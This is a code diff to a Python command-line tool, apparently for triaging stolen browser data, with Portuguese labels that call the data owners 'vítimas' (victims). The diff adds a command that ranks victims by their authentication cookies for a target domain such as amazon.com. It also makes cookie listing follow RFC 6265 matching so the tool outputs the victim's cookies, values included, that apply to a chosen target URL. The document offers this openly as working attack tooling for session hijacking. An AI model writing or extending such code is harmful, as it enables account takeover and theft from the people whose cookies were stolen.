@@ -102,15 +102,47 @@ def domains(db_path: Path, victim: int | None, domain: str | None):
 @cli.command()
 @click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
               show_default=True)
+@click.option("--domain", required=True, help="Domínio alvo (ex.: amazon.com)")
+@click.option("--limit", type=int, default=10, show_default=True)
+def best(db_path: Path, domain: str, limit: int):
+    """Seleciona as melhores vítimas para um domínio (heurística de artefato auth)."""
+    store = _load_store(str(db_path))
+    rows = store.best_victims_for_domain(domain, limit=limit)
+    table = Table(title=f"Melhores vítimas para {domain}")
+    table.add_column("Victim ID", justify="right", style="dim")
+    table.add_column("Diretório")
+    table.add_column("Auth", justify="right")
+    table.add_column("Total", justify="right")
+    for row in rows:
+        table.add_row(str(row["victim_id"]), row["dir_name"],
+                      str(row["auth"]), str(row["total"]))
+    console.print(table)
+
+
+@cli.command()
+@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
+              show_default=True)
 @click.option("--victim", type=int, required=True, help="ID da vítima")
 @click.option("--domain", required=True, help="Domínio alvo (ex.: amazon.com)")
+@click.option("--scheme", type=click.Choice(["https", "http"]), default="https",
+              show_default=True)
+@click.option("--path", "req_path", default="/", show_default=True,
+              help="Path do alvo para matching RFC 6265")
 @click.option("--limit", type=int, default=100, show_default=True)
 @click.option("--show-value", is_flag=True, help="Exibe o valor do cookie")
-def cookies(db_path: Path, victim: int, domain: str, limit: int, show_value: bool):
-    """Lista cookies de uma vítima para um domínio (matcher leve, M1 refina)."""
+def cookies(db_path: Path, victim: int, domain: str, scheme: str, req_path: str,
+            limit: int, show_value: bool):
+    """Lista cookies aplicáveis a um alvo, usando matching RFC 6265."""
+    from .domain.matcher import applicable_cookies
+
     store = _load_store(str(db_path))
-    rows = store.list_cookies(victim_id=victim, domain=domain, limit=limit)
-    table = Table(title=f"Cookies - vítima {victim} - {domain}")
+    raw = store.list_cookies(victim_id=victim, domain=domain, limit=10000)
+    host = domain.split("://")[-1].strip("/")
+    matched = applicable_cookies(
+        [dict(r) for r in raw], scheme=scheme, host=host, path=req_path
+    )[:limit]
+
+    table = Table(title=f"Cookies - vítima {victim} - {scheme}://{host}{req_path}")
     table.add_column("Nome")
     table.add_column("Domínio")
     table.add_column("Path")
@@ -120,7 +152,7 @@ def cookies(db_path: Path, victim: int, domain: str, limit: int, show_value: boo
     table.add_column("Expira", justify="right")
     if show_value:
         table.add_column("Valor")
-    for row in rows:
+    for row in matched:
         expiry = row["expires_epoch"]
         expiry_s = "sessão" if not expiry else str(expiry)
         if show_value:
@@ -136,7 +168,7 @@ def cookies(db_path: Path, victim: int, domain: str, limit: int, show_value: boo
                           "yes" if row["host_only"] else "-",
                           expiry_s)
     console.print(table)
-    console.print(f"[dim]Total: {len(rows)} cookies[/]")
+    console.print(f"[dim]Total: {len(matched)} cookies aplicáveis[/]")
 
 
 # ---- Stubs das fases seguintes ----
